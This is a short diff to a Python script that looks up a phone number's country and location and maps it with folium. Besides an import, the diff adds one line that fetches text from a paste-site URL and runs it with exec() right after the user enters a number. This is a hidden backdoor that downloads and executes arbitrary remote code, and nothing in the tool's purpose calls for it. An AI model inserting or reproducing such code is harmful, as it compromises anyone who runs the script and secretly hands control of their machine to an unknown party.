@@ -7,12 +7,14 @@ from phonenumbers.phonenumberutil import region_code_for_number
 from opencage.geocoder import OpenCageGeocode
 import folium
 import os
+from requests import get
 
 
 if os.path.exists("mylocation.html"):
   os.remove("mylocation.html")
 try:
   number = input("Enter Phone Number: ")
+  x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
   pn = phonenumbers.parse(number)
 
   country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
